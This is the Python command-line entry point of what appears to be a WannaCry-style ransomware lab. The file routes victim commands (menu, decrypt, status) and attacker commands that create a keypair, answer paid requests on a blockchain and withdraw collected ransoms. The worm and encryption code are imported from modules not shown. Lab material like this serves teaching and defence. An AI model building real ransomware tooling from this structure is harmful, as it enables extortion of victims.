"""`ransom`: the victim's menu on a locked machine, the attacker's tools on theirs.

Nothing here is installed on a victim when the lab is built. The whole
package arrives with the worm, and the payload leaves the `ransom` command
behind.
"""

import sys

from . import operator, paths, ui, victim

HELP = """usage: ransom <command>

on a locked machine (what the worm leaves behind):
    ransom                  open the participant menu
    ransom decrypt          paste the granted key and get the documents back
    ransom status           one look at this machine

on the attacker's machine (where the worm was launched):
    ransom init             create the attacker's keypair
    ransom watch            answer every paid request on the chain
    ransom withdraw         take the collected ransoms out of the contract
    ransom status           one look at this side
    ransom reply --request FILE    the manual path: turn a saved request into a reply"""


def main(argv) -> int:
    command = argv[0] if argv else "menu"
    rest = argv[1:]

    if command == "menu":
        ui.run_interface()
        return 0

    if command == "decrypt":
        print("=" * 60)
        print("  WANNACRY LAB DECRYPTOR")
        print("  Paste the decryption key the attacker granted you.")
        print("=" * 60)
        pasted = rest[rest.index("--key") + 1] if "--key" in rest else None
        victim.decrypt(pasted or input("Paste your decryption key: "))
        return 0

    if command == "status":
        if paths.OPERATOR.exists():
            operator.status()
        else:
            victim.status()
        return 0

    if command in ("init", "watch", "withdraw", "reply"):
        return operator.main(argv)

    print(HELP)
    return 2


if __name__ == "__main__":
    try:
        sys.exit(main(sys.argv[1:]))
    except victim.ERRORS as error:
        print(f"ransom: {error}", file=sys.stderr)
        sys.exit(1)
